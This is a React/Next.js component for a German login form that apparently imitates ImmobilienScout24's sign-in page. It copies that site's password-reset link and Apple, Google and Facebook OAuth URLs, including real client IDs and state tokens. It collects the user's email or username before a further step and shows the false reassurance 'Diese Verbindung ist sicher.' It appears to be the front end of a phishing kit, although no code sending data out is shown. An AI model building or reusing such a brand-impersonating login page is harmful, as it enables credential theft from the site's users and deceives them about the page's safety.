import styles from "../../styles/Home.module.css";
import Link from "next/link";

function EmailForm({ err, changeForm, data, handleChange  }) {
  return (
    <>
      <span className={styles.formTitle}>Anmelden oder registrieren</span>

      {err ? <div className={styles.errDiv}>
        <span className={styles.statusErr}>&#9888;</span>
        <div className={styles.errTxtDiv}>
          <span className={styles.bigFont}>E-Mail / Benutzername falsch</span>
          <span className={styles.smallFont}>Bitte korrigieren Sie Ihre Angaben</span>
        </div>
      </div> : null }

      <label className={styles.emailLable}>E-Mail oder Benutzername</label>
      <input
          type="email"
          autoComplete="email"
          name="email"
          autoFocus
          value={data.email}
          onChange={handleChange}
          className={styles.emailInput}
        />
      <button onClick={changeForm} type="button" className={styles.emailBtn}>Weiter</button>
      <Link className={styles.resetLink} href="https://sso.immobilienscout24.de/sso/forgotPassword?appName=is24main&source=meinkontodropdown-login&sso_return=https%3A%2F%2Fwww.immobilienscout24.de%2Fsso%2Flogin.go%3Fsource%3Dmeinkontodropdown-login%26returnUrl%3D%2Fgeschlossenerbereich%2Fstart.html%3Fsource%253Dmeinkontodropdown-login">Zugangsdaten vergessen?</Link>  

      <div className={styles.lineCont}>
        <span className={styles.lineTxt}>oder</span>
        <hr className={styles.line}></hr>
      </div>
        
        <Link href="https://appleid.apple.com/auth/authorize?scope=email&state=THIybU4zTFQrZklyNi95dUtCczVTNXlieCthTHBhQW5mN0p4eFIyZXdseDBCNStZajNRbytleWYwK041alV1dQ&client_id=de.immobilienscout24&redirect_uri=https%3A%2F%2Flogin.immobilienscout24.de%2Foauth2%2Fv1%2Fauthorize%2Fcallback&response_type=code&response_mode=form_post&display=page">
          <button className={styles.appleBtn}> <img className={styles.appleIcon} src="/apple-white.png" /> Mit Apple anmelden</button>
        </Link>

        <Link href="https://accounts.google.com/o/oauth2/auth/identifier?state=SVRQeUM5NFpoNlJJUTdvU1MyaHBlVXZVSWhVNk9rUkRoMmdjZ2lDaDQyTnpka21SdjZqQi9seGszdC81RjRRWg&client_id=208472424340-9ig1qbigbgkseng4g05gsmvtrgloqhel.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Flogin.immobilienscout24.de%2Foauth2%2Fv1%2Fauthorize%2Fcallback&response_type=code&display=page&scope=profile%20email&service=lso&o2v=1&flowName=GeneralOAuthFlow">
          <button className={styles.googleBtn}> <img className={styles.googleIcon} src="/google.png" /> Mit Google anmelden</button>
        </Link>        
        
        <Link href="https://www.facebook.com/login.php?skip_api_login=1&api_key=725356997489663&kid_directed_site=0&app_id=725356997489663&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fstate%3DRW1NVFJRTUFOcVlJM25JN3lJZWhVQ0VLdlZ6M1U4TFhEKzFib3o1RFRSWitzbW5iVGt6Mkxzb0Vxemp0UldqdA%26client_id%3D725356997489663%26redirect_uri%3Dhttps%253A%252F%252Flogin.immobilienscout24.de%252Foauth2%252Fv1%252Fauthorize%252Fcallback%26response_type%3Dcode%26display%3Dpage%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D60f527eb-e401-4fc0-8896-d912b50ce7d7%26tp%3Dunspecified&cancel_url=https%3A%2F%2Flogin.immobilienscout24.de%2Foauth2%2Fv1%2Fauthorize%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DRW1NVFJRTUFOcVlJM25JN3lJZWhVQ0VLdlZ6M1U4TFhEKzFib3o1RFRSWitzbW5iVGt6Mkxzb0Vxemp0UldqdA%23_%3D_&display=page&locale=en_US&pl_dbl=0">
          <button className={styles.fbBtn}> <img className={styles.fbIcon} src="/facebook-white.png" /> Mit Facebook anmelden </button>
        </Link>

        <span className={styles.backMess}><img src='/icn_lock.svg'/> <span className={styles.backMessText}>Diese Verbindung ist sicher.</span></span>
      </>
  )
}

export default EmailForm;